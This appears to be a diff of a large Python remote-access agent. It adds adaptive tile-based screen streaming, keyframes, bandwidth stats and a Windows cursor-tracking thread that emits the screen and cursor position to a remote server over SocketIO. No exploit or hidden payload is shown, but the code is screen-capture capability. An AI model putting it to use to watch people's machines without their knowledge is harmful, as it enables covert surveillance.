-                    jpeg_quality = 10  # Medium quality
-                else:
-                    jpeg_quality = 15  # Good quality when queue empty
-                
-                is_success, encoded = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, jpeg_quality])
-                if is_success:
-                    try:
-                        if encode_queue.full():
-                            encode_queue.get_nowait()
-                        encode_queue.put_nowait(encoded.tobytes())
-                    except queue.Full:
-                        pass
+                ema_tiles = (0.8 * ema_tiles) + (0.2 * float(tiles_encoded))
+                if queue_fullness > 0.7 or tiles_encoded > int(grid_tiles * 0.4):
+                    diff_thresh = min(diff_thresh + 1, 32)
+                    tile_jpeg_q = max(35, tile_jpeg_q - 5)
+                    if tiles_encoded > int(grid_tiles * 0.6):
+                        tile_size = min(128, max(16, tile_size * 2))
+                        prev_gray = None
+                        last_keyframe_ts = 0.0
+                elif queue_fullness < 0.2 and tiles_encoded < max(4, int(grid_tiles * 0.05)):
+                    diff_thresh = max(4, diff_thresh - 1)
+                    tile_jpeg_q = min(60, tile_jpeg_q + 2)
+                    if ema_tiles < 12 and tile_size > 32:
+                        tile_size = max(32, tile_size // 2)
+                DELTA_DIFF_THRESHOLD = diff_thresh
+                STREAM_TILE_SIZE = tile_size
+                try:
+                    ADAPTIVE_STATS_SCREEN['ema_tiles'] = float(ema_tiles)
+                    ADAPTIVE_STATS_SCREEN['tile_size'] = int(tile_size)
+                    ADAPTIVE_STATS_SCREEN['diff_threshold'] = int(diff_thresh)
+                except Exception:
+                    pass
+                prev_gray = gray
             except KeyboardInterrupt:
                 log_message("Screen encode worker interrupted")
                 break
@@ -19628,7 +19930,7 @@ def screen_send_worker(agent_id):
         while STREAMING_ENABLED:
             try:
                 try:
-                    frame = encode_queue.get(timeout=0.5)
+                    item = encode_queue.get(timeout=0.5)
                 except queue.Empty:
                     continue
                 
@@ -19643,41 +19945,87 @@ def screen_send_worker(agent_id):
                     continue
                 
                 try:
-                    frame_b64 = base64.b64encode(frame).decode('utf-8')
-                    frame_data_url = f'data:image/jpeg;base64,{frame_b64}'
-                    rate_limit_before_send(len(frame))
-                    safe_emit('screen_frame', {'agent_id': agent_id, 'frame': frame_data_url})
-                    
-                    frame_size = len(frame)
-                    bytes_sent += frame_size
-                    bytes_this_second += frame_size
-                    frame_count += 1
-                    
-                    # Check if we've exceeded bandwidth limit this second
+                    size = 0
                     now = time.time()
+                    if isinstance(item, dict) and 'type' in item:
+                        if item['type'] == 'frame':
+                            raw = item['bytes']
+                            b64 = base64.b64encode(raw).decode('utf-8')
+                            data_url = f'data:image/jpeg;base64,{b64}'
+                            rate_limit_before_send(len(raw))
+                            safe_emit('screen_frame', {'agent_id': agent_id, 'frame_id': item.get('frame_id'), 'frame': data_url})
+                            size = len(raw)
+                        elif item['type'] == 'keyframe':
+                            raw = item['bytes']
+                            b64 = base64.b64encode(raw).decode('utf-8')
+                            data_url = f'data:image/jpeg;base64,{b64}'
+                            rate_limit_before_send(len(raw))
+                            safe_emit('screen_keyframe', {'agent_id': agent_id, 'frame_id': item.get('frame_id'), 'width': item.get('width'), 'height': item.get('height'), 'frame': data_url})
+                            size = len(raw)
+                        elif item['type'] == 'tile':
+                            raw = item['bytes']
+                            b64 = base64.b64encode(raw).decode('utf-8')
+                            data_url = f'data:image/jpeg;base64,{b64}'
+                            rate_limit_before_send(len(raw))
+                            safe_emit('screen_tile', {'agent_id': agent_id, 'frame_id': item.get('frame_id'), 'x': item.get('x'), 'y': item.get('y'), 'w': item.get('w'), 'h': item.get('h'), 'frame': data_url})
+                            size = len(raw)
+                    else:
+                        raw = item if isinstance(item, (bytes, bytearray)) else bytes(item)
+                        b64 = base64.b64encode(raw).decode('utf-8')
+                        data_url = f'data:image/jpeg;base64,{b64}'
+                        rate_limit_before_send(len(raw))
+                        safe_emit('screen_frame', {'agent_id': agent_id, 'frame': data_url})
+                        size = len(raw)
+                    
+                    if size > 0:
+                        bytes_sent += size
+                        bytes_this_second += size
+                        frame_count += 1
+                    
                     if now - second_start >= 1.0:
-                        # New second, reset counter
                         bytes_this_second = 0
                         second_start = now
                     elif bytes_this_second >= max_bytes_per_second:
-                        # Hit bandwidth limit, sleep until next second
                         sleep_time = 1.0 - (now - second_start)
                         if sleep_time > 0:
                             time.sleep(sleep_time)
                         bytes_this_second = 0
                         second_start = time.time()
                     
-                    # Log stats every 5 seconds
                     if now - last_stats_time >= 5.0:
                         elapsed = now - start_time
                         fps = frame_count / elapsed if elapsed > 0 else 0
                         mbps = (bytes_sent / elapsed / 1024 / 1024) if elapsed > 0 else 0
-                        log_message(f"Screen stream: {fps:.1f} FPS, {mbps:.1f} MB/s, {frame_count} frames total")
+                        log_message(f"Screen stream: {fps:.1f} FPS, {mbps:.1f} MB/s, {frame_count} packets total")
                         last_stats_time = now
+                    if now - last_stats_emit >= 2.0:
+                        elapsed = now - start_time
+                        fps = frame_count / elapsed if elapsed > 0 else 0
+                        mbps = (bytes_sent / elapsed / 1024 / 1024) if elapsed > 0 else 0
+                        try:
+                            stats_payload = {
+                                'agent_id': agent_id,
+                                'stats': {
+                                    'screen': {
+                                        'fps': float(fps),
+                                        'quality': str(SCREEN_JPEG_QUALITY),
+                                        'bandwidth_mbps': float(mbps),
+                                        'avg_frame_time': float(1000.0 / fps) if fps > 0 else 0.0,
+                                    },
+                                    'delta': {
+                                        'tile_size': int(ADAPTIVE_STATS_SCREEN.get('tile_size', STREAM_TILE_SIZE)),
+                                        'diff_threshold': int(ADAPTIVE_STATS_SCREEN.get('diff_threshold', DELTA_DIFF_THRESHOLD)),
+                                        'ema_tiles': float(ADAPTIVE_STATS_SCREEN.get('ema_tiles', 0.0)),
+                                    }
+                                }
+                            }
+                            safe_emit('stream_stats_update', stats_payload)
+                        except Exception:
+                            pass
+                        last_stats_emit = now
                     
                 except Exception as e:
                     error_msg = str(e)
-                    # Silence "not a connected namespace" errors
                     if "not a connected namespace" not in error_msg and "Connection is closed" not in error_msg:
                         log_message(f"SocketIO send error: {e}", "error")
                     time.sleep(0.1)
@@ -19704,6 +20052,7 @@ def stream_screen_h264_socketio(agent_id):
         threading.Thread(target=screen_capture_worker, args=(agent_id,), daemon=True),
         threading.Thread(target=screen_encode_worker, args=(agent_id,), daemon=True),
         threading.Thread(target=screen_send_worker, args=(agent_id,), daemon=True),
+        threading.Thread(target=cursor_emit_worker, args=(agent_id,), daemon=True),
     ]
     for t in STREAM_THREADS:
         t.start()
@@ -19720,6 +20069,30 @@ def stream_screen_webrtc_or_socketio(agent_id):
         return stream_screen_h264_socketio(agent_id)
 
 # Removed duplicate functions - these are already defined above
+def cursor_emit_worker(agent_id):
+    global STREAMING_ENABLED, sio
+    try:
+        while STREAMING_ENABLED:
+            try:
+                import ctypes
+                from ctypes import wintypes
+                pt = wintypes.POINT()
+                ctypes.windll.user32.GetCursorPos(ctypes.byref(pt))
+                sw = int(ctypes.windll.user32.GetSystemMetrics(0))
+                sh = int(ctypes.windll.user32.GetSystemMetrics(1))
+                safe_emit('cursor_update', {
+                    'agent_id': agent_id,
+                    'x': int(pt.x),
+                    'y': int(pt.y),
+                    'screen_w': sw,
+                    'screen_h': sh,
+                    'visible': True
+                })
+            except Exception:
+                pass
+            time.sleep(0.016)
+    except KeyboardInterrupt:
+        pass
 
 # Documented: Modern streaming pipeline uses three threads and two queues for capture, encode, and send. Each stage is non-blocking and drops oldest frames if overloaded. FPS and buffer sizes are configurable.
 
